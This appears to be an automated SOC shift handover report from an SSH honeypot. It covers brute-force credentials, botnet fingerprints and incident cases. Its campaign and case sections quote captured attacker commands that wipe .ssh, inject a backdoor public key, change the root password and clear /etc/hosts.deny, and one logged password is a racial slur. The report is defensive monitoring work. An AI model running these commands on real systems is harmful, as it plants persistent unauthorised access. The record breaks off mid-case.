# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-07 |
| **Generated At** | 2026-06-07T11:51:36Z |
| **Shift Time** | 11:51 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **307** |
| Confirmed Threats | **270** |
| False Positives Filtered | **37** (12.0%) |
| Unique Attacker IPs | **25** |
| Countries of Origin | **10** |
| High Severity Cases | **28** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **279** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **70** |
| Unique Credential Pairs | **39** |
| Unique Usernames | **21** |
| Unique Passwords | **38** |
| Successful Auth Pairs | **22** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 28 |
| `345gs5662d34` | 13 |
| `ubuntu` | 10 |
| `user` | 2 |
| `user01` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 13 |
| `3245gs5662d34` | 12 |
| `` | 9 |
| `12345678` | 2 |
| `1qaz@WSX#` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 13 |
| `root` | `3245gs5662d34` | 12 |
| `ubuntu` | `` | 9 |
| `root` | `1qaz@WSX#` | 1 |
| `root` | `kenneth` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `1qaz@WSX#` | `187.33.59.116` | 2026-06-07T09:20:42 |
| `root` | `3245gs5662d34` | `187.33.59.116` | 2026-06-07T09:20:50 |
| `root` | `kenneth` | `187.33.59.116` | 2026-06-07T09:23:15 |
| `root` | `P@$$word!@#` | `187.33.59.116` | 2026-06-07T09:25:49 |
| `root` | `6yhn7ujm` | `113.31.103.129` | 2026-06-07T09:34:50 |
| `root` | `3245gs5662d34` | `113.31.103.129` | 2026-06-07T09:34:54 |
| `root` | `1qazZAQ!` | `165.154.231.236` | 2026-06-07T09:35:27 |
| `root` | `3245gs5662d34` | `165.154.231.236` | 2026-06-07T09:35:30 |
| `root` | `Root@#$123` | `172.190.51.254` | 2026-06-07T10:02:17 |
| `root` | `3245gs5662d34` | `172.190.51.254` | 2026-06-07T10:02:24 |
| `root` | `aabb1234` | `172.190.51.254` | 2026-06-07T10:06:54 |
| `root` | `Welkom01` | `187.33.59.116` | 2026-06-07T10:30:37 |
| `root` | `@qwer2025` | `172.190.51.254` | 2026-06-07T10:45:13 |
| `root` | `Root1234!!` | `172.190.51.254` | 2026-06-07T10:55:13 |
| `root` | `1104` | `172.190.51.254` | 2026-06-07T11:00:39 |
| `root` | ` ` | `45.10.175.77` | 2026-06-07T11:32:22 |
| `root` | `zU23Xq5eqH` | `47.121.184.138` | 2026-06-07T11:33:23 |
| `root` | `12345Aa` | `165.154.1.18` | 2026-06-07T11:36:56 |
| `root` | `3245gs5662d34` | `165.154.1.18` | 2026-06-07T11:36:59 |
| `root` | `abcd` | `45.158.14.124` | 2026-06-07T11:38:34 |
| `root` | `3245gs5662d34` | `45.158.14.124` | 2026-06-07T11:38:41 |
| `root` | `niggers` | `45.158.14.124` | 2026-06-07T11:43:00 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **307** |
| Sessions with Fingerprint | **7** |
| Unique HASSH Fingerprints | **7** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 73 |
| OpenSSH | 10 |
| Go SSH scanner | 1 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 56 | 7 |
| `03a80b21afa8...` | Modern SSH client | 14 | 1 |
| `eeca2460550b...` | libssh-based | 6 | 1 |
| `701158e75b50...` | Modern SSH client | 4 | 1 |
| `4e066189c3bb...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 56 | 7 | Mirai/variant |
| `03a80b21afa8...` | libssh | 14 | 1 | Modern SSH client |
| `eeca2460550b...` | OpenSSH | 6 | 1 | libssh-based |
| `701158e75b50...` | OpenSSH | 4 | 1 | Modern SSH client |
| `95420f9d932d...` | libssh | 3 | 2 | — |
| `4e066189c3bb...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `1b8acd46a07d...` | Unknown | 1 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 12 | 6 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:7Iz1S7o9YNLx"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `172.190.51.254`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:yFmiizjUcfdj"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `187.33.59.116`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `165.154.231.236`, `172.190.51.254`, `45.158.14.124`, `113.31.103.129`, `187.33.59.116`, `165.154.1.18`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **25** |
| Unique ASNs | **20** |
| High-Risk ASNs | **16** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS398324` | Censys, Inc. | 2 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |
| `AS58946` | GRAMEEN COMMUNICATIONS | 1 | HIGH |
| `AS207326` | HostLAB Bilisim Teknolojileri A.S. | 1 | HIGH |
| `AS52938` | EMA Comércio de Eletrônicos e Servicos Ltda. | 1 | HIGH |
| `AS63949` | Akamai Connected Cloud | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (28)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-990ba5439d4f

| Field | Detail |
|---|---|
| **Source IP** | `187.33.59[.]116` |
| **First Seen** | 2026-06-07 09:20 |
| **Last Seen** | 2026-06-07 09:20 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 09:20:41` | `cowrie.session.connect` |
| `2026-06-07 09:20:41` | `cowrie.client.version` |
| `2026-06-07 09:20:41` | `cowrie.client.kex` |
| `2026-06-07 09:20:42` | `cowrie.login.success` |
| `2026-06-07 09:20:43` | `cowrie.session.params` |
| `2026-06-07 09:20:43` | `cowrie.command.input` |
| `2026-06-07 09:20:43` | `cowrie.command.failed` |
| `2026-06-07 09:20:44` | `cowrie.log.closed` |
| `2026-06-07 09:20:44` | `cowrie.session.params` |
| `2026-06-07 09:20:44` | `cowrie.command.input` |
| `2026-06-07 09:20:44` | `cowrie.session.file_download` |
| `2026-06-07 09:20:44` | `cowrie.log.closed` |
| `2026-06-07 09:20:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.33.59[.]116` to AbuseIPDB if not already reported
- [ ] Block `187.33.59[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4363b10bd640

| Field | Detail |
|---|---|
| **Source IP** | `187.33.59[.]116` |
| **First Seen** | 2026-06-07 09:20 |
| **Last Seen** | 2026-06-07 09:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 09:20:48` | `cowrie.session.connect` |
| `2026-06-07 09:20:48` | `cowrie.client.version` |
| `2026-06-07 09:20:48` | `cowrie.client.kex` |
| `2026-06-07 09:20:50` | `cowrie.login.success` |
| `2026-06-07 09:20:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.33.59[.]116` to AbuseIPDB if not already reported
- [ ] Block `187.33.59[.]116` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bce3a744497

| Field | Detail |
|---|---|
| **Source IP** | `187.33.59[.]116` |
| **First Seen** | 2026-06-07 09:23 |
| **Last Seen** | 2026-06-07 09:23 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 09:23:14` | `cowrie.session.connect` |
| `2026-06-07 09:23:14` | `cowrie.client.version` |
| `2026-06-07 09:23:14` | `cowrie.client.kex` |
| `2026-06-07 09:23:15` | `cowrie.login.success` |
| `2026-06-07 09:23:16` | `cowrie.session.params` |
| `2026-06-07 09:23:16` | `cowrie.command.input` |
| `2026-06-07 09:23:16` | `cowrie.command.failed` |
| `2026-06-07 09:23:17` | `cowrie.log.closed` |
| `2026-06-07 09:23:17` | `cowrie.session.params` |
| `2026-06-07 09:23:17` | `cowrie.command.input` |
| `2026-06-07 09:23:17` | `cowrie.session.file_download` |
| `2026-06-07 09:23:17` | `cowrie.log.closed` |
| `2026-06-07 09:23:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.33.59[.]116` to AbuseIPDB if not already reported
- [ ] Block `187.33.59[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0d73850d3bc

| Field | Detail |
|---|---|
| **Source IP** | `187.33.59[.]116` |
| **First Seen** | 2026-06-07 09:23 |
| **Last Seen** | 2026-06-07 09:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 09:23:21` | `cowrie.session.connect` |
| `2026-06-07 09:23:21` | `cowrie.client.version` |
| `2026-06-07 09:23:21` | `cowrie.client.kex` |
| `2026-06-07 09:23:23` | `cowrie.login.success` |
| `2026-06-07 09:23:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.33.59[.]116` to AbuseIPDB if not already reported
- [ ] Block `187.33.59[.]116` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6eed4bc451f7

| Field | Detail |
|---|---|
| **Source IP** | `187.33.59[.]116` |
| **First Seen** | 2026-06-07 09:25 |
| **Last Seen** | 2026-06-07 09:27 |
| **Session Duration** | 87s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:yFmiizjUcfdj"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 09:25:48` | `cowrie.session.connect` |
| `2026-06-07 09:25:48` | `cowrie.client.version` |
| `2026-06-07 09:25:48` | `cowrie.client.kex` |
| `2026-06-07 09:25:49` | `cowrie.login.success` |
| `2026-06-07 09:25:50` | `cowrie.session.params` |
| `2026-06-07 09:25:50` | `cowrie.command.input` |
| `2026-06-07 09:25:50` | `cowrie.command.failed` |
| `2026-06-07 09:25:51` | `cowrie.log.closed` |
| `2026-06-07 09:25:51` | `cowrie.session.params` |
| `2026-06-07 09:25:51` | `cowrie.command.input` |
| `2026-06-07 09:25:51` | `cowrie.session.file_download` |
| `2026-06-07 09:25:51` | `cowrie.log.closed` |
| `2026-06-07 09:26:03` | `cowrie.session.params` |
| `2026-06-07 09:26:03` | `cowrie.command.input` |
| `2026-06-07 09:26:04` | `cowrie.log.closed` |
| `2026-06-07 09:26:04` | `cowrie.session.params` |
| `2026-06-07 09:26:04` | `cowrie.command.input` |
| `2026-06-07 09:26:05` | `cowrie.log.closed` |
| `2026-06-07 09:26:05` | `cowrie.session.params` |
| `2026-06-07 09:26:05` | `cowrie.command.input` |
| `2026-06-07 09:26:05` | `cowrie.session.file_download` |
| `2026-06-07 09:26:05` | `cowrie.log.closed` |
| `2026-06-07 09:26:06` | `cowrie.session.params` |
| `2026-06-07 09:26:06` | `cowrie.command.input` |
| `2026-06-07 09:26:07` | `cowrie.log.closed` |
| `2026-06-07 09:26:07` | `cowrie.session.params` |
| `2026-06-07 09:26:07` | `cowrie.command.input` |
| `2026-06-07 09:26:08` | `cowrie.log.closed` |
| `2026-06-07 09:26:08` | `cowrie.session.params` |
| `2026-06-07 09:26:08` | `cowrie.command.input` |
| `2026-06-07 09:26:08` | `cowrie.command.input` |
| `2026-06-07 09:26:09` | `cowrie.log.closed` |
| `2026-06-07 09:26:09` | `cowrie.session.params` |
| `2026-06-07 09:26:09` | `cowrie.command.input` |
| `2026-06-07 09:26:10` | `cowrie.log.closed` |
| `2026-06-07 09:26:10` | `cowrie.session.params` |
| `2026-06-07 09:26:10` | `cowrie.command.input` |
| `2026-06-07 09:26:11` | `cowrie.log.closed` |
| `2026-06-07 09:26:11` | `cowrie.session.params` |
| `2026-06-07 09:26:11` | `cowrie.command.input` |
| `2026-06-07 09:27:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.33.59[.]116` to AbuseIPDB if not already reported
- [ ] Block `187.33.59[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-beb035fdbf0f

| Field | Detail |
|---|---|
| **Source IP** | `113.31.103[.]129` |
| **First Seen** | 2026-06-07 09:34 |
| **Last Seen** | 2026-06-07 09:34 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 09:34:36` | `cowrie.session.connect` |
| `2026-06-07 09:34:49` | `cowrie.client.version` |
| `2026-06-07 09:34:49` | `cowrie.client.kex` |
| `2026-06-07 09:34:50` | `cowrie.login.success` |
| `2026-06-07 09:34:50` | `cowrie.session.params` |
| `2026-06-07 09:34:50` | `cowrie.command.input` |
| `2026-06-07 09:34:50` | `cowrie.command.failed` |
| `2026-06-07 09:34:51` | `cowrie.log.closed` |
| `2026-06-07 09:34:51` | `cowrie.session.params` |
| `2026-06-07 09:34:51` | `cowrie.command.input` |
| `2026-06-07 09:34:51` | `cowrie.session.file_download` |
| `2026-06-07 09:34:51` | `cowrie.log.closed` |
| `2026-06-07 09:34:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.31.103[.]129` to AbuseIPDB if not already reported
- [ ] Block `113.31.103[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57cb45e91327

| Field | Detail |
|---|---|
| **Source IP** | `113.31.103[.]129` |
| **First Seen** | 2026-06-07 09:34 |
| **Last Seen** | 2026-06-07 09:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 09:34:53` | `cowrie.session.connect` |
| `2026-06-07 09:34:53` | `cowrie.client.version` |
| `2026-06-07 09:34:53` | `cowrie.client.kex` |
| `2026-06-07 09:34:54` | `cowrie.login.success` |
| `2026-06-07 09:34:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.31.103[.]129` to AbuseIPDB if not already reported
- [ ] Block `113.31.103[.]129` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2791c4f2989e

| Field | Detail |
|---|---|
| **Source IP** | `165.154.231[.]236` |
| **First Seen** | 2026-06-07 09:35 |
| **Last Seen** | 2026-06-07 09:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 09:35:26` | `cowrie.session.connect` |
| `2026-06-07 09:35:26` | `cowrie.client.version` |
| `2026-06-07 09:35:26` | `cowrie.client.kex` |
| `2026-06-07 09:35:27` | `cowrie.login.success` |
| `2026-06-07 09:35:27` | `cowrie.session.params` |
| `2026-06-07 09:35:27` | `cowrie.command.input` |
| `2026-06-07 09:35:27` | `cowrie.command.failed` |
| `2026-06-07 09:35:27` | `cowrie.log.closed` |
| `2026-06-07 09:35:28` | `cowrie.session.params` |
| `2026-06-07 09:35:28` | `cowrie.command.input` |
| `2026-06-07 09:35:28` | `cowrie.session.file_download` |
| `2026-06-07 09:35:28` | `cowrie.log.closed` |
| `2026-06-07 09:35:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.231[.]236` to AbuseIPDB if not already reported
- [ ] Block `165.154.231[.]236` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0c9921c7ba8

| Field | Detail |
|---|---|
| **Source IP** | `165.154.231[.]236` |
| **First Seen** | 2026-06-07 09:35 |
| **Last Seen** | 2026-06-07 09:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 09:35:30` | `cowrie.session.connect` |
| `2026-06-07 09:35:30` | `cowrie.client.version` |
| `2026-06-07 09:35:30` | `cowrie.client.kex` |
| `2026-06-07 09:35:30` | `cowrie.login.success` |
| `2026-06-07 09:35:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.231[.]236` to AbuseIPDB if not already reported
- [ ] Block `165.154.231[.]236` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7280fc88087a

| Field | Detail |
|---|---|
| **Source IP** | `172.190.51[.]254` |
| **First Seen** | 2026-06-07 10:02 |
| **Last Seen** | 2026-06-07 10:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
